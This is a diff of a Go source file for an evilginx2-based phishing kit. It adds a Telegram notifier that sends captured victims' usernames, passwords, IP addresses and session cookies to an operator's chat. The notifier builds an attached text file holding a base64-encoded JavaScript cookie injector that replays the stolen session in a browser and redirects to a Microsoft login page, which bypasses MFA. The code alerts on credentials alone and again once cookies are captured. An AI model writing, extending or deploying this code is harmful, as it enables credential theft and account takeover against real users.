@@ -7,189 +7,172 @@ import (
 	"math/rand"
 	"os"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/kgretzky/evilginx2/database"
+	"github.com/kgretzky/evilginx2/log"
 )
 
-type Token struct {
-	Name             string      `json:"name"`
-	Value            string      `json:"value"`
-	Domain           string      `json:"domain"`
-	HostOnly         bool        `json:"hostOnly"`
-	Path             string      `json:"path"`
-	Secure           bool        `json:"secure"`
-	HttpOnly         bool        `json:"httpOnly"`
-	SameSite         string      `json:"sameSite"`
-	Session          bool        `json:"session"`
-	FirstPartyDomain string      `json:"firstPartyDomain"`
-	PartitionKey     interface{} `json:"partitionKey"`
-	ExpirationDate   *int64      `json:"expirationDate,omitempty"`
-	StoreID          interface{} `json:"storeId"`
+type exportCookie struct {
+	Path           string `json:"path"`
+	Domain         string `json:"domain"`
+	ExpirationDate int64  `json:"expirationDate"`
+	Value          string `json:"value"`
+	Name           string `json:"name"`
+	HttpOnly       bool   `json:"httpOnly"`
+	HostOnly       bool   `json:"hostOnly"`
+	Secure         bool   `json:"secure"`
+	Session        bool   `json:"session"`
 }
 
-func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
-	var tokens []Token
+var telegramMessageIDs = make(map[string]int)
+var telegramMu sync.Mutex
 
-	for domain, tokenGroup := range input {
-		for _, tokenData := range tokenGroup {
-			var t Token
+func sessionHasNotifyableTokens(s *database.Session) bool {
+	if s == nil {
+		return false
+	}
+	return len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0
+}
 
-			if name, ok := tokenData["Name"].(string); ok {
-				// Remove &
-				t.Name = name
-			}
-			if val, ok := tokenData["Value"].(string); ok {
-				t.Value = val
-			}
-			// Add leading dot to domain for cross-subdomain cookies
-			if len(domain) > 0 && domain[0] != '.' {
-				domain = "." + domain
-			}
-			t.Domain = domain
+func sessionHasNotifyableCredentials(s *database.Session) bool {
+	if s == nil {
+		return false
+	}
+	return s.Username != "" || s.Password != ""
+}
 
-			if hostOnly, ok := tokenData["HostOnly"].(bool); ok {
-				t.HostOnly = hostOnly
-			}
-			if path, ok := tokenData["Path"].(string); ok {
-				t.Path = path
-			}
-			if secure, ok := tokenData["Secure"].(bool); ok {
-				t.Secure = secure
-			}
-			if httpOnly, ok := tokenData["HttpOnly"].(bool); ok {
-				t.HttpOnly = httpOnly
-			}
-			if sameSite, ok := tokenData["SameSite"].(string); ok {
-				t.SameSite = sameSite
-			}
-			if session, ok := tokenData["Session"].(bool); ok {
-				t.Session = session
-			}
-			if fpd, ok := tokenData["FirstPartyDomain"].(string); ok {
-				t.FirstPartyDomain = fpd
-			}
-			if pk, ok := tokenData["PartitionKey"]; ok {
-				t.PartitionKey = pk
-			}
+func sessionShouldNotifyTelegram(s *database.Session) bool {
+	return sessionHasNotifyableTokens(s) || sessionHasNotifyableCredentials(s)
+}
 
-			if storeID, ok := tokenData["storeId"]; ok {
-				t.StoreID = storeID
-			} else if storeID, ok := tokenData["StoreID"]; ok {
-				t.StoreID = storeID
+func cookieTokensToExportJSON(tokens map[string]map[string]*database.CookieToken) (string, error) {
+	var cookies []*exportCookie
+	for domain, tmap := range tokens {
+		for k, v := range tmap {
+			if v == nil || v.Value == "" {
+				continue
 			}
-
-			exp := time.Now().AddDate(1, 0, 0).Unix()
-			t.ExpirationDate = &exp
-
-			tokens = append(tokens, t)
+			c := &exportCookie{
+				Path:           v.Path,
+				Domain:         domain,
+				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
+				Value:          v.Value,
+				Name:           k,
+				HttpOnly:       v.HttpOnly,
+				Secure:         false,
+				Session:        false,
+			}
+			if strings.HasPrefix(k, "__Host-") || strings.HasPrefix(k, "__Secure-") {
+				c.Secure = true
+			}
+			if len(domain) > 0 && domain[0] == '.' {
+				c.HostOnly = false
+			} else {
+				c.HostOnly = true
+			}
+			if c.Path == "" {
+				c.Path = "/"
+			}
+			cookies = append(cookies, c)
 		}
 	}
-	return tokens
-}
-
-func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string) ([]Token, error) {
-	var consolidatedTokens []Token
-
-	// Parse and extract tokens for each category
-	for _, tokenJSON := range []string{sessionTokens, httpTokens, bodyTokens} {
-		if tokenJSON == "" {
-			continue
-		}
-
-		var rawTokens map[string]map[string]map[string]interface{}
-		if err := json.Unmarshal([]byte(tokenJSON), &rawTokens); err != nil {
-			return nil, fmt.Errorf("error parsing token JSON: %v", err)
-		}
-
-		tokens := extractTokens(rawTokens)
-		consolidatedTokens = append(consolidatedTokens, tokens...)
+	if len(cookies) == 0 {
+		return "[]", nil
 	}
-
-	return consolidatedTokens, nil
+	out, err := json.Marshal(cookies)
+	if err != nil {
+		return "", err
+	}
+	return string(out), nil
 }
 
-// Define a map to store session IDs and a mutex for thread-safe access
-var processedSessions = make(map[string]bool)
-var sessionMessageMap = make(map[string]int)
-var mu sync.Mutex
+func jsSafeBacktick(s string) string {
+	s = strings.ReplaceAll(s, `\`, `\\`)
+	s = strings.ReplaceAll(s, "`", "\\`")
+	return s
+}
 
 func generateRandomString() string {
-	rand.Seed(time.Now().UnixNano())
 	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-	length := 10
-	randomStr := make([]byte, length)
-	for i := range randomStr {
-		randomStr[i] = charset[rand.Intn(len(charset))]
+	b := make([]byte, 10)
+	for i := range b {
+		b[i] = charset[rand.Intn(len(charset))]
 	}
-	return string(randomStr)
+	return string(b)
 }
-func createTxtFile(session TSession) (string, error) {
+
+func createTxtFileFromSession(s *database.Session) (string, error) {
+	if s == nil {
+		return "", fmt.Errorf("session is nil")
+	}
+
 	var txtFileName string
-	if session.Username != "" {
-		// Sanitize email for use as filename: replace @ with _at_ and . with _
-		sanitized := strings.NewReplacer("@", "_at_", "/", "_", "\\", "_", ":", "_", "*", "_", "?", "_", "\"", "_", "<", "_", ">", "_", "|", "_").Replace(session.Username)
+	if s.Username != "" {
+		sanitized := strings.NewReplacer("@", "_at_", "/", "_", "\\", "_", ":", "_", "*", "_", "?", "_", "\"", "_", "<", "_", ">", "_", "|", "_").Replace(s.Username)
 		txtFileName = sanitized + ".txt"
 	} else {
 		txtFileName = generateRandomString() + ".txt"
 	}
 	txtFilePath := filepath.Join(os.TempDir(), txtFileName)
 
-	txtFile, err := os.Create(txtFilePath)
-	if err != nil {
-		return "", fmt.Errorf("failed to create file: %v", err)
-	}
-	defer txtFile.Close()
-
-	// Marshal all token sources
-	tJ, _ := json.Marshal(session.Tokens)
-	hJ, _ := json.Marshal(session.HTTPTokens)
-	bJ, _ := json.Marshal(session.BodyTokens)
-	cJ, _ := json.Marshal(session.Custom)
-
-	allTokens, err := processAllTokens(string(tJ), string(hJ), string(bJ), string(cJ))
+	cookiesJSON, err := cookieTokensToExportJSON(s.CookieTokens)
 	if err != nil {
 		return "", err
 	}
 
-	// If no tokens collected, create empty array to avoid null
-	if allTokens == nil {
-		allTokens = []Token{}
+	redirectURL := s.LandingURL
+	if redirectURL == "" {
+		redirectURL = "https://login.microsoftonline.com"
 	}
 
-	// Marshal into compact JSON for JS parser
-	finalJson, _ := json.Marshal(allTokens)
-
-	// Base64 encode redirect URL
-	redirectUrl := base64.StdEncoding.EncodeToString([]byte("https://login.microsoftonline.com"))
-
-	// Build JS injector payload
 	var payload strings.Builder
-	payload.WriteString(fmt.Sprintf("let ipaddress = `%s`;\n", session.RemoteAddr))
-	payload.WriteString(fmt.Sprintf("let email = `%s`;\n", session.Username))
-	payload.WriteString(fmt.Sprintf("let password = `%s`;\n", session.Password))
-	
-	// IIFE with cookie injection and redirect
-	payload.WriteString(fmt.Sprintf(
-		"!function(){let e=JSON.parse(`%s`);\n"+
-		"for(let o of e)document.cookie=`${o.name}=${o.value};Max-Age=31536000;${o.path?`path=${o.path};`:\"\"}${o.domain?`${o.path?\"\":\"path=/\"}domain=${o.domain};`:\"\"}Secure;SameSite=None`;"+
-		"window.location.href=atob('%s')}();",
-		string(finalJson),
-		redirectUrl,
-	))
+	payload.WriteString(fmt.Sprintf("let ipaddress = `%s`;\n", jsSafeBacktick(s.RemoteAddr)))
+	payload.WriteString(fmt.Sprintf("let email = `%s`;\n", jsSafeBacktick(s.Username)))
+	payload.WriteString(fmt.Sprintf("let password = `%s`;\n", jsSafeBacktick(s.Password)))
 
-	_, err = txtFile.WriteString(payload.String())
-	if err != nil {
-		return "", err
+	cookieCount := countCookieTokens(s.CookieTokens)
+	if cookieCount > 0 {
+		cookiesB64 := base64.StdEncoding.EncodeToString([]byte(cookiesJSON))
+		redirectB64 := base64.StdEncoding.EncodeToString([]byte(redirectURL))
+		payload.WriteString(fmt.Sprintf(
+			"!function(){let e=JSON.parse(atob('%s'));\n"+
+				"for(let o of e)document.cookie=`${o.name}=${o.value};Max-Age=31536000;${o.path?`path=${o.path};`:\"\"}${o.domain?`${o.path?\"\":\"path=/\"}domain=${o.domain};`:\"\"}Secure;SameSite=None`;\n"+
+				"window.location.href=atob('%s')}();",
+			cookiesB64,
+			redirectB64,
+		))
+	} else {
+		payload.WriteString("// No session cookies captured (wrong password, MFA, or login not complete).\n")
 	}
 
+	if len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
+		extra, _ := json.Marshal(map[string]interface{}{
+			"body_tokens": s.BodyTokens,
+			"http_tokens": s.HttpTokens,
+			"custom":      s.Custom,
+		})
+		payload.WriteString("\n// additional tokens\n")
+		payload.Write(extra)
+		payload.WriteString("\n")
+	}
+
+	if err := os.WriteFile(txtFilePath, []byte(payload.String()), 0600); err != nil {
+		return "", fmt.Errorf("failed to write file: %v", err)
+	}
 	return txtFilePath, nil
 }
 
-func formatSessionMessage(session TSession) string {
-	// Format the session information (no token data in message)
+func formatSessionMessage(s *database.Session) string {
+	cookieCount := countCookieTokens(s.CookieTokens)
+	footer := "📦 Session cookies are in the attached txt file."
+	if cookieCount == 0 {
+		footer = "⚠️ Credentials only — no session cookies (wrong password, MFA, or login not finished)."
+	}
 	return fmt.Sprintf("✨ Session Information ✨\n\n"+
-
 		"👤 Username:      ➖ %s\n"+
 		"🔑 Password:      ➖ %s\n"+
 		"🌐 Landing URL:   ➖ %s\n \n"+
@@ -197,70 +180,94 @@ func formatSessionMessage(session TSession) string {
 		"🌍 Remote Address:➖ %s\n"+
 		"🕒 Create Time:   ➖ %d\n"+
 		"🕔 Update Time:   ➖ %d\n"+
+		"🍪 Cookies:       ➖ %d\n"+
 		"\n"+
-		"📦 Tokens are added in txt file and attached separately in message.\n",
-
-		session.Username,
-		session.Password,
-		session.LandingURL,
-		session.UserAgent,
-		session.RemoteAddr,
-		session.CreateTime,
-		session.UpdateTime,
+		"%s\n",
+		s.Username,
+		s.Password,
+		s.LandingURL,
+		s.UserAgent,
+		s.RemoteAddr,
+		s.CreateTime,
+		s.UpdateTime,
+		cookieCount,
+		footer,
 	)
 }
-func Notify(session TSession, chatid string, teletoken string) {
 
-	mu.Lock()
-	// Check if the session is already processed
-	if processedSessions[string(session.ID)] {
-		mu.Unlock()
-		messageID, exists := sessionMessageMap[string(session.ID)]
-		if exists {
-			txtFilePath, err := createTxtFile(session)
-			if err != nil {
-				fmt.Println("Error creating TXT file for update:", err)
-				return
+func countCookieTokens(tokens map[string]map[string]*database.CookieToken) int {
+	n := 0
+	for _, tmap := range tokens {
+		for _, v := range tmap {
+			if v != nil && v.Value != "" {
+				n++
 			}
-			msg_body := formatSessionMessage(session)
-			err = editMessageFile(chatid, teletoken, messageID, txtFilePath, msg_body)
-			if err != nil {
-				fmt.Printf("Error editing message: %v\n", err)
-			}
-			os.Remove(txtFilePath)
-		} else {
-			fmt.Println("Message ID not found for session:", session.ID)
+		}
+	}
+	return n
+}
+
+func telegramMessageIDForSession(s *database.Session) (int, bool) {
+	telegramMu.Lock()
+	defer telegramMu.Unlock()
+	if id, ok := telegramMessageIDs[s.SessionId]; ok {
+		return id, true
+	}
+	if s.Tmsgid != "" {
+		if id, err := strconv.Atoi(s.Tmsgid); err == nil && id > 0 {
+			telegramMessageIDs[s.SessionId] = id
+			return id, true
+		}
+	}
+	return 0, false
+}
+
+func setTelegramMessageID(sid string, messageID int, db *database.Database) {
+	telegramMu.Lock()
+	telegramMessageIDs[sid] = messageID
+	telegramMu.Unlock()
+	if db != nil {
+		_ = db.SetSessionTmsgid(sid, strconv.Itoa(messageID))
+	}
+}
+
+// NotifyTelegramSession loads the session from the database and sends or updates Telegram notification.
+// Notifies on credentials alone (e.g. wrong password) and again when cookies are captured later.
+func NotifyTelegramSession(db *database.Database, sid string, chatid string, teletoken string) {
+	if db == nil || sid == "" || chatid == "" || teletoken == "" {
+		return
+	}
+
+	s, err := db.GetSessionBySid(sid)
+	if err != nil {
+		log.Error("telegram: session %s: %v", sid, err)
+		return
+	}
+	if !sessionShouldNotifyTelegram(s) {
+		log.Debug("telegram: session %s has nothing to send yet, skipping", sid)
+		return
+	}
+
+	txtFilePath, err := createTxtFileFromSession(s)
+	if err != nil {
+		log.Error("telegram: create txt: %v", err)
+		return
+	}
+	defer os.Remove(txtFilePath)
+
+	message := formatSessionMessage(s)
+
+	if messageID, ok := telegramMessageIDForSession(s); ok {
+		if err := editMessageFile(chatid, teletoken, messageID, txtFilePath, message); err != nil {
+			log.Error("telegram: edit message: %v", err)
 		}
 		return
 	}
 
-	// Mark session as processed
-	processedSessions[string(session.ID)] = true
-	mu.Unlock()
-
-	// Create the TXT file for the original message
-	txtFilePath, err := createTxtFile(session)
-	if err != nil {
-		fmt.Println("Error creating TXT file:", err)
-		return
-	}
-
-	// Format the message
-	message := formatSessionMessage(session)
-
-	// Send the notification and get the message ID
 	messageID, err := sendTelegramNotification(chatid, teletoken, message, txtFilePath)
 	if err != nil {
-		fmt.Printf("Error sending Telegram notification: %v\n", err)
-		os.Remove(txtFilePath)
+		log.Error("telegram: send: %v", err)
 		return
 	}
-
-	// Map the session ID to the message ID
-	mu.Lock()
-	sessionMessageMap[string(session.ID)] = messageID
-	mu.Unlock()
-
-	// Remove the temporary TXT file
-	os.Remove(txtFilePath)
+	setTelegramMessageID(sid, messageID, db)
 }
